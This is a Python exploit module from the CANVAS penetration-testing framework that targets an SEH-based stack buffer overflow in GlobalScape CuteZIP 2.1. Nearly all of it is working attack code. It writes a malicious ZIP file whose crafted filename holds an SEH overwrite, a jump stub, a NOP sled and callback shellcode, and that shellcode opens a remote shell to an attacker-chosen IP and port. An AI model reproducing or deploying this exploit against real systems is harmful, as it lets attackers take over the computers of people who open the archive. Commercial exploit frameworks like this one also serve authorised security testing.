#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2007
#http://www.immunityinc.com/CANVAS/ for more information

from __future__ import with_statement

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import canvasengine

from exploitutils import *
from tcpexploit import *
from canvasexploit import *

import zipfile_fixed as zipfile

from MOSDEF import mosdef
from engine.config import canvas_root_directory

NAME                              = 'CuteZIP Stack Buffer Overflow'
DESCRIPTION                       = 'CuteZIP Stack Buffer Overflow'

DOCUMENTATION                     = {}
DOCUMENTATION['VENDOR']           = "GlobalScape"
DOCUMENTATION['Date public']      = ''
DOCUMENTATION['References']       = ''
DOCUMENTATION['Repeatability']    = ''
DOCUMENTATION['VersionsAffected'] = 'CuteZIP 2.1'
DOCUMENTATION['CVE Name']         = 'N/A'
DOCUMENTATION['CVE Url']          = ''
DOCUMENTATION['CVSS']             = 0

VERSION                           = '1.0'

PROPERTY                          = {}
PROPERTY['TYPE']                  = 'Exploit'
PROPERTY['SITE']                  = 'Clientside'
PROPERTY['ARCH']                  = [['Windows']]
PROPERTY['VERSION']               = ['XP']

DOCUMENTATION['Notes']            = """
Buffer overflow SEH based for GlobalScape CuteZip 2.1. Tested on Windows 7 SP1.
"""

CHANGELOG                         = """
"""

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.version       = 0
        self.name          = NAME
        self.filename      = 'cutefile.zip'
        self.badstring     = '\x00' + '\x0a' + '\x0d' + '\x01'
        self.subesp        = 0
        self.name          = NAME
        self.autoFind      = False # Prevent callback 127.0.0.1
        self.callback_ip   = None
        self.callback_port = 5555

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def _get_random_string(self,length=8):
        values = [ random.choice(string.uppercase) for x in range(length) ]
        return "".join(values)

    def makefile(self):
        injectme = self.createWin32Shellcode_universal(self.badstring,
                                                       self.callback_ip,
                                                       self.callback_port)

        sc = shellcodeGenerator.win32()
        sc.vProtectSelf=False
        sc.vAllocSelf = False
        sc.addAttr("findeipnoesp", {"subespval": 0})
        sc.addAttr("InjectToSelf", { "injectme" : injectme })
        self.shellcode  = sc.get()


        aaa = self._get_random_string(1148)
        seh =      "\xEB\x06\x00\x00"
        seh +=     "\xe9\x46\x40\x00" # pop pop ret
        asm =      "\x83\xC4\x58\x58\xFF\xD0"
        nop = "\x90" * 200
        filename = aaa + seh + asm + nop + self.shellcode

        output = StringIO.StringIO()
        zf = zipfile.ZipFile(output, mode='w')
        zf.write(os.path.abspath(os.path.join(os.path.dirname(__file__), "Resources/", "dummy.txt")), filename)
        zf.close()

        return output.getvalue()

    def getArgs(self):
        self.getarg("filename")
        self.getarg("callback_ip")
        self.getarg("callback_port")

    def run(self):
        self.getArgs()

        if not self.filename:
            self.log('No filename given, aborting..')
            return 0

        if not self.callback_ip:
            self.log('No callback IP given, aborting..')
            return 0

        if not self.callback_port:
            self.log('No callback port given, aborting..')
            return 0

        evil_data = self.makefile()
        self.log('Opening %s for output'%(self.filename))

        try:
            with open(self.filename, 'wb') as f:
                f.write(evil_data)
                self.log('Wrote to %s'%(self.filename))
        except Exception, ex:
            self.log('Error: %s' % ex)
            return 0

        self.log('Do not forget to start a listener at %s:%s' % (self.callback_ip, self.callback_port))
        return 1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)

    if ret not in [0,1,None]:
        ret.interact()

